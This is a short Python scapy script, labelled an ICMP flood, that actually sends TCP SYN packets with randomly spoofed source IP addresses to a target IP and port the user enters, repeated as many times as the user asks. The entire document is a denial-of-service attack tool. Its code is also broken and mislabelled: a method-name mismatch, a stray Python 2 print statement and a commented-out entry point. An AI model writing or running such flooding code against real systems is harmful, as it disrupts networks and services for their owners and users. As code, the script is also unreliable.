from scapy.all import *

class ICMPFlood:
    def __init__(self):
        print("Start ICMP Flood.")
        dst_ip, dst_port = self.info()
        counter = input("How many packets do you want to send : ")
        self.SYN_Flood(dst_ip, dst_port, int(counter))

    def random_ip(self):
        ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        return ip

    def rand_int(self):
        x = random.randint(1000, 9000)
        return x

    def syn_flood(self, dst_ip, dst_port, counter):
        total = 0
        print
        "Packets are sending ..."
        for x in range(0, counter):
            s_port = self.rand_int()
            s_eq = self.rand_int()
            window = self.rand_int()

            ip_packet = IP()
            ip_packet.src = self.random_ip()
            ip_packet.dst = dst_ip

            tcp_packet = TCP()
            tcp_packet.sport = s_port
            tcp_packet.dport = dst_port
            tcp_packet.flags = "S"
            tcp_packet.seq = s_eq
            tcp_packet.window = window

            send(ip_packet / tcp_packet, verbose=0)
            total += 1
        sys.stdout.write("\nTotal packets sent: %i\n" % total)

    def info(self):
        dst_ip = input("\nTarget IP : ")
        dst_port = input("Target Port : ")
        return dst_ip, int(dst_port)

    #def main(self):


#if __name__ == '__main__':

